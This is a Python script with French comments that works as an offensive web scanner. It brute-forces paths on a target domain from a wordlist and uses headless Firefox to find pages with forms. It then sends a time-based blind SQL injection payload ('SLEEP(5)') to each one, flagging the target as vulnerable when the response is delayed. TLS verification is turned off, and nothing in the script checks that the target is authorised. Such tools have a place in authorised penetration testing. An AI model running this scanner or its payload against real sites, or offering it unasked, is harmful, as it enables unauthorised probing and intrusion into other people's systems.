#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import time
import requests
import asyncio
import aiohttp
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

async def perform_blind_injection(url):
    """
    Effectue un test d'injection SQL aveugle sur l'URL donnée en ajoutant un paramètre d'injection.
    Un payload de type time-based est utilisé pour provoquer un délai si l'injection est effective.
    """
    # Payload de type time-based : provoque un délai de 5 secondes si l'injection réussit.
    injection_payload = "' OR IF(1=1, SLEEP(5), 0)-- "
    
    # Analyse l'URL et ajoute le paramètre 'injection'
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)
    query_params["injection"] = injection_payload
    new_query = urlencode(query_params, doseq=True)
    injection_url = urlunparse(parsed._replace(query=new_query))
    
    print(f"[*] Testing blind injection on: {injection_url}")
    
    async with aiohttp.ClientSession() as session:
        start_time = time.time()
        try:
            async with session.get(injection_url) as response:
                await response.text()  # Nous mesurons uniquement le temps de réponse
        except Exception as e:
            print(f"[!] Error during injection test on {url}: {e}")
            return
        elapsed = time.time() - start_time
        print(f"[+] Response time for {url}: {elapsed:.2f} seconds")
        if elapsed > 4:
            print(f"[!] Possible blind SQL injection vulnerability detected on {url}!")
        else:
            print(f"[-] No significant delay detected on {url}.")

def check_url_for_form(url, headless=True):
    """
    Charge la page à l'URL donnée avec Firefox en mode headless et vérifie la présence d'un formulaire.
    Renvoie True si un formulaire est détecté, sinon False.
    """
    firefox_options = Options()
    if headless:
        firefox_options.headless = True

    driver = webdriver.Firefox(options=firefox_options)
    try:
        print(f"[*] Loading page: {url}")
        driver.get(url)
        # Attendre 2 secondes pour le chargement de la page
        time.sleep(2)
        html = driver.page_source.lower()
        if "<form" in html:
            print(f"[!] Form detected on {url}")
            return True
        else:
            print(f"[+] No form detected on {url}")
            return False
    except Exception as e:
        print(f"[!] Error with Selenium for URL {url}: {e}")
        return False
    finally:
        driver.quit()

def main():
    """
    1. Lit le domaine depuis bin/temp/domain.txt.
    2. Lit le chemin de la wordlist depuis bin/temp/wordlist.txt.
    3. Construit les URLs à partir de la wordlist et teste leur statut HTTP.
    4. Pour chaque URL valide (HTTP 200), vérifie la présence d'un formulaire.
       Si un formulaire est détecté, planifie un test d'injection SQL aveugle asynchrone.
    5. Lance tous les tests d'injection de manière asynchrone.
    """
    # Lecture du domaine
    domain_path = "bin/temp/domain.txt"
    if not os.path.isfile(domain_path):
        print(f"[!] Fichier introuvable: {domain_path}")
        return
    with open(domain_path, "r", encoding="utf-8") as f:
        domain = f.read().strip()

    # Lecture du chemin de la wordlist
    wordlist_path_file = "bin/temp/wordlist.txt"
    if not os.path.isfile(wordlist_path_file):
        print(f"[!] Fichier introuvable: {wordlist_path_file}")
        return
    with open(wordlist_path_file, "r", encoding="utf-8") as f:
        wordlist_path = f.read().strip()

    if not os.path.isfile(wordlist_path):
        print(f"[!] Impossible de trouver la wordlist: {wordlist_path}")
        return

    # Lecture du contenu de la wordlist
    try:
        with open(wordlist_path, "r", encoding="utf-8") as f:
            paths = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[!] Erreur lors de la lecture de la wordlist: {e}")
        return

    print(f"[+] Domaine: {domain}")
    print(f"[+] Wordlist: {wordlist_path}")
    print(f"[+] Nombre de chemins à tester: {len(paths)}")
    print("=========================================")

    domain = domain.rstrip("/")
    injection_tasks = []

    # Pour chaque chemin, construire l'URL, vérifier le statut HTTP, puis détecter un formulaire
    for path in paths:
        if path.startswith("/"):
            url = domain + path
        else:
            url = domain + "/" + path

        try:
            response = requests.get(url, timeout=5, verify=False)
            if response.status_code == 200:
                print(f"[+] URL valide: {url} (HTTP 200)")
                if check_url_for_form(url, headless=True):
                    injection_tasks.append(perform_blind_injection(url))
            else:
                print(f"[-] {url} => Statut {response.status_code}")
        except requests.RequestException as req_err:
            print(f"[!] Erreur réseau pour {url}: {req_err}")

    if injection_tasks:
        print("=========================================")
        print("[*] Lancement des tests d'injection SQL aveugle sur les URLs avec formulaire...")
        async def run_injections():
            await asyncio.gather(*injection_tasks)
        asyncio.run(run_injections())
    else:
        print("[+] Aucune URL avec formulaire détectée dans ce scan.")

if __name__ == "__main__":
    main()
